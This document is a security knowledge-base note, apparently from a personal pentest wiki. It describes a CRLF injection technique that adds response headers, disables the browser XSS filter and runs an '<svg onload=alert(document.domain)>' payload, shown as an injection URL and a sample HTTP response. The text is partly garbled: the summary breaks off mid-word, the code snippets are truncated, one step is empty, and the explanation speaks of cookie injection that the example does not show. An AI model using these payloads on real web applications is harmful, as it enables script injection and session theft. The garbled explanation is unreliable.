---
id: cf2ae0a8-68fe-4088-a422-6b7e2f66d2e8
name: CRLF Cookie Injection XSS Bypass
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:55.302762+00:00'
updated_at: '2023-04-06T03:55:55.314871+00:00'
tags:
- '[[Carriage Return Line Feed]]'
- '[[CRLF - Add a cookie - XSS Bypass]]'
commands:
- '[[HTTP Response]]'
---

# CRLF Cookie Injection XSS Bypass

## Summary

The CRLF Cookie Injection XSS Bypass technique is used to bypass security controls in web applications. The attacker injects a cookie with a payload that includes a CRLF sequence, which is interpreted by the web application as a new header. The payload includes an XSS attack, which is executed by t

## Description

# Description

The CRLF Cookie Injection XSS Bypass technique is used to bypass security controls in web applications. The attacker injects a cookie with a payload that includes a CRLF sequence, which is interpreted by the web application as a new header. The payload includes an XSS attack, which is executed by the web application, bypassing the XSS filter. This technique can be used to steal sensitive information, such as session cookies or credentials, or to perform other malicious actions on the victim's machine.

 

## Requirements

1. Access to a vulnerable web application

 

## Defense

1. Implement input validation and output encoding to prevent CRLF injection attacks

1. Implement XSS filters to prevent XSS attacks

1. Implement secure cookie handling practices to prevent cookie theft and misuse.

 

## Objectives

1. Bypass XSS filters in web applications

1. Steal sensitive information

 

# Instructions

1. Replace 'http://example.com' with the target URL and modify the payload as needed.

 



**Code**: [[http://example.com/%0d%0aContent-Length:35%0d%0aX-]]



> This command injects a cookie with a payload that includes a CRLF sequence and an XSS attack. The payload is sent in the HTTP request header, and is interpreted by the web application as a new header. The XSS attack is executed by the web application, bypassing the XSS filter.

2. 

 



**Code**: [[HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GM]]



> This command shows the HTTP response of the web application after the cookie with the payload has been injected. The response includes the payload, which has been executed by the web application, bypassing the XSS filter.



**Command** ([[HTTP Response]]):

```bash
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```



## Commands Used

- [[HTTP Response]]

## Tags

- [[Carriage Return Line Feed]]
- [[CRLF - Add a cookie - XSS Bypass]]


